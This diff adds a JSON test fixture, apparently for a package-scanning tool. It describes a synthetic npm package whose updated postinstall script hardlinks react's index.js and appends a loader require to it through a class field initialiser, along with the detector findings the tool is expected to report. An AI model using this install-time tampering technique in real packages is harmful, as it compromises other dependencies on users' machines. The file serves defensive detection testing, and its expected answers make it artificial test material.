@@ -1,0 +1,76 @@
+{
+  "id": "install-root-link-class-field",
+  "title": "Existing postinstall hook hardlinks a sibling file and writes it from a class field initialiser",
+  "category": "install-time-self-propagation",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "The write runs from a class field initialiser after the hardlink is made, which no simple call-order model places. The hardlink alone voids every write proof in the package, so the order never needs to be worked out. Inert fixture.",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 34,
+      "sha256": "prev-install-js",
+      "flags": [],
+      "textSample": "console.log('tinyfmt installed');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 295,
+      "sha256": "staged-install-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\nconst SRC = path.join(__dirname, '..', '..', 'node_modules', 'react', 'index.js');\nconst own = path.join(__dirname, 'h.js');\nclass A { x = fs.appendFileSync(own, \"require('tinyfmt/loader');\\n\"); }\nfs.linkSync(SRC, own);\nnew A();\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ],
+  "expectedReleaseRisk": "high",
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ]
+}
